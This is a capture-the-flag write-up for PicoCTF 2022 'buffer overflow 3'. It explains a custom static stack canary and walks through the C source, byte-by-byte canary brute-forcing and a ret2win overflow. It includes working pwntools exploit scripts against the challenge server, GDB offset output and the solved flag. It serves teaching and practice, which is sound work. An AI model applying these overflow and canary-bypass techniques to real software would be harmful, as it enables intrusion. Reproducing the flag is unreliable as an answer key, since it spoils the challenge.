---
layout: single
title:  "PicoCTF 2022 - buffer overflow 3"
categories: 
  - PicoCTF
  - Binary Exploitation
tags:
  - ctf
  - picoctf
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: "An introduction to stack canaries + ret2win."
---

An introduction to stack canaries + ret2win.

## Preamble - Stack Canaries

From [CTF 101](https://ctf101.org/binary-exploitation/stack-canaries/):
> Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immediately.

Crucially, we wish to note that stack canaries can be broken through **brute-force attacks**. This will be useful for us later on in this challenge, as the stack canary being used in this program is not a typical stack canary (i.e., not created/handled during program compilation).

## My Solution

As usual, we will look at the `vuln` binary. Using `checksec`, we observe the following:

```bash
$ checksec vuln                                                                     
[*] '.../vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

As mentioned earlier, there exists a stack canary in this program - it's just that the stack canary being implemented is a custom canary done up by the problem author, and not by the compiler (hence why `checksec` thinks that there is no canary).

To prove that there exists a (custom) stack canary, we can simply flood the program input with junk, in an attempt to induce a buffer overflow.

```bash
$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 80
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```

We can look at `vuln.c` to better understand how the canary was implemented.

```c
...
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  ... // omitted for brevity
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

Looking at this program, we observe two important features:

Firstly, we see that the stack canary is just a 4 byte string. Crucially, this canary value is non-random, and remains unchanged regardless of the number of times we execute this program, as its value is simply derived from a `canary.txt` file found within the same directory of this program. This means that the canary value is static.

Next, the `canary` string variable was declared just before the `buf` string variable in `vuln()`. Recall that these variables are actually stack variables, and due to this order of declaration, the stack memory spaces allocated for these variables will be contiguous to each other. What this therefore implies, is that if we overflow the allocated buffer space `buf`, we will end up overflowing into `canary` as well, since the buffer space of `canary` lies directly above that of `buf`.

### Brute-forcing the canary

To come up with the logic behind our brute-force attack, we'll use the fact that the read buffer size is 64 bytes, and that the next 4 bytes in memory are allocated to our canary value, which is unknown. Let's now do some testing with a local canary value of `BBBB`.

Suppose we pass in 64 bytes of data. Logically, this should not touch our canary value at all since we are not overflowing out of `buf`, and thus, we should not receive any stack smashing error from the program.

```bash
$ python3 -c "print('A' * 64)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 64
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ok... Now Where's the Flag?
```

If we want to visualize the buffer and canary in memory, it should look something like this:

```text
## Stack ##
---------
BBBB      <-- this region in memory belongs to the canary. It is untouched.
---------
AAAA..... <-- this region in memory belongs to our read buffer. We have flooded it with As.
---------
```

Now, suppose we pass in 65 bytes of As. This will cause one byte of our canary to get overwritten since our read buffer size is only 64 bytes, and this should trigger a stack smashing error.

```bash
$ python3 -c "print('A' * 65)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 65
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```

```text
## Stack ##
---------
ABBB      <-- the least significant canary byte was changed to an A, and the canary value is no longer correct.
---------
AAAA.....
---------
```

Now, let's change the 65th byte to a B. This should not trigger any error as the canary value should still be correct.

```bash
$ python3 -c "print('A' * 64 + 'B')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 65
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
Ok... Now Where's the Flag?
```

```text
## Stack ##
---------
BBBB      <-- the least significant canary byte was modified, but it was changed to a B, and thus, the canary value remains correct.
---------
AAAA.....
---------
```

So, using this knowledge, we can craft our canary brute-force exploit for this program, where our goal is to determine the canary value, byte by byte. To know if we are on the right track, we'll need to see if the program throws any error. If no error is thrown for our custom payload, we can conclude that the byte at the current position is correct, since it matches the value found in the stored `canary.txt` file. This exploit should not take too much time as the canary value is only 4 bytes in length.

Using Python 3 and pwntools to create our brute-force script:

```python
# bruteforce.py

from pwn import *

elf = ELF('./vuln')
libc = elf.libc
context.log_level = 'error'

offset = b'A' * 64
canary = b''

while len(canary) < 4:
    for i in range(1, 256): # test all possible byte values (except null byte)
        char = chr(i).encode()
        payload = offset + canary + char # craft payload with testing canary

        # p = process(elf.path)
        p = remote('saturn.picoctf.net', 60206)

        p.recvline().decode("utf-8")
        p.sendline(str(len(payload)).encode())
        p.recvuntil(b'Input> ')
        p.sendline(payload)
        # print(payload)
        resp = p.recvall().decode()
        if "Ok" in resp: # byte in current position is correct
            canary += char # append to canary value
            print(canary)
            p.close()
            break
        p.close()

print("Stack canary is:")
print(canary.decode())
```

By running the script, we know that the static canary value is `BiRd`.

Now, since we know the canary value, we can proceed to derive the offset to EIP, and craft our ret2win exploit as per normal.

Using `readelf`,

```bash
$ readelf -s vuln
>> Symbol table '.symtab' contains 77 entries:
...
70: 08049336   179 FUNC    GLOBAL DEFAULT   15 win
...
```

The address of `win()` is `0x08049336`.

Next, we'll be using GDB to find the EIP offset. Let's prepare the first chunk of our payload first:

```bash
$ python -c 'print "A"*64 + "BiRd"' # to fill the buffer + canary
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABiRd
```

Now, using GDB,

```bash
$ gdb vuln
>> ...
gef➤  pattern create 64
[+] Generating a pattern of 64 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: .../vuln
How Many Bytes will You Write Into the Buffer?
> 200
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABiRdaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
Ok... Now Where's the Flag?

Program received signal SIGSEGV, Segmentation fault.
0x61616165 in ?? ()
...
gef➤  pattern offset $eip
[+] Searching for '65616161'/'61616165' with period=4
[+] Found at offset 16 (little-endian search) likely
```

Therefore, the offset to EIP is 16.

We can now craft our overall exploit. Using Python 3 and pwntools:

```python
# solve.py

from pwn import *
# elf = ELF('./vuln') # for local execution
# p = process(elf.path) # for local execution
p = remote('saturn.picoctf.net', 53066) # for remote execution

# payload
payload = b'A' * 64 # read buffer offset
payload += b'BiRd' # canary value
payload += b'A' * 16 # eip offset
payload += p32(0x08049336) # win()

p.recvline()
p.sendline(str(len(payload)).encode())
p.recvuntil(b"Input> ")
p.sendline(payload)
print(p.recvall().decode())
```

```bash
[+] Opening connection to saturn.picoctf.net on port 53066: Done
[+] Receiving all data: Done (70B)
[*] Closed connection to saturn.picoctf.net port 53066
Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}
```

## Learning Takeaways

This was an interesting challenge that helped me better understand how stack canaries worked. Even though the stack canary being used here wasn't an actual stack canary, it still managed to convey the idea of how a canary value could work to protect against buffer overflows, and how the canary could be broken through brute-force attacks.

I think that leaking the canary value through format strings could be achieved as well (especially since `printf()` was being used here), and certainly, it does seem like this is a legitimate strategy to bypass actual stack canaries when brute-force attacks are not feasible. I'll have to give this challenge another go when I'm free.

## References

- [John Hammond (YouTube): PWN - Bruteforcing Stack Canaries (PicoCTF 2022 #44 'buffer-overflow3')](https://www.youtube.com/watch?v=fGgafrmx1fA&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=45)
